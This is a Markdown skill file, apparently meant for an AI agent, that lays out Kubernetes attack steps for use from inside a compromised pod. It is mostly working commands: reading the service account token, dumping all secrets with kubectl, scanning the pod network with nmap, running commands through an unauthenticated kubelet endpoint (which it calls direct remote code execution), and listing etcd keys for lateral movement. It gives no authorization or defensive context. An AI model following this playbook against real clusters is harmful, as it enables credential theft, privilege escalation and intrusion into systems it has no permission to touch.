---
name: k8s-network-recon
description: "Kubernetes network reconnaissance: API server access, service discovery, DNS enumeration, and lateral movement inside a cluster. Use this skill once inside a cluster network."
---

# K8s Network Recon

## Overview

A cluster is a flat network with a DNS service that enumerates itself. The API server is the prize.

## From inside a pod

```bash
env | grep -i kube
cat /etc/resolv.conf
# DNS search domains reveal the namespace
```

## Service discovery

```bash
# DNS-based
nslookup kubernetes.default.svc.cluster.local
for i in $(seq 1 254); do nslookup 10.96.0.$i 2>/dev/null | grep name; done

# scan the pod network
nmap -sn 10.244.0.0/24
nmap -sT -p 80,443,8080,6379,9200 10.244.0.0/24
```

## API server

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl --cacert $CA -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

```bash
kubectl --token=$TOKEN --server=https://kubernetes.default.svc --certificate-authority=$CA auth can-i --list
kubectl --token=$TOKEN get pods -A
kubectl --token=$TOKEN get secrets -A -o yaml
```

## Exposed services

| Port | Service |
|---|---|
| 2379 | etcd |
| 6443 | API server |
| 10250 | kubelet |
| 10255 | kubelet read-only (old) |
| 8080 | API insecure (old) |

```bash
curl -k https://NODE:10250/pods
curl -k https://NODE:10250/run/NAMESPACE/POD/CONTAINER -d "cmd=id"
```

The kubelet API often has no auth on older clusters — that is a direct RCE.

## etcd

```bash
etcdctl --endpoints=https://NODE:2379 --cacert ca.crt --cert client.crt --key client.key get / --prefix --keys-only
```

etcd holds all secrets.

## Lateral movement

- Every pod can reach every other pod by default (no NetworkPolicy).
- Databases (Redis, Elasticsearch, MySQL) inside the cluster are usually unauthenticated.

## Pitfalls

- NetworkPolicy may segment the cluster.
- RBAC restricts the SA token to its namespace.
- The API server may be reachable only through a service, not directly.

## Verification

The API call must return cluster data, or the bare service must respond on its port.
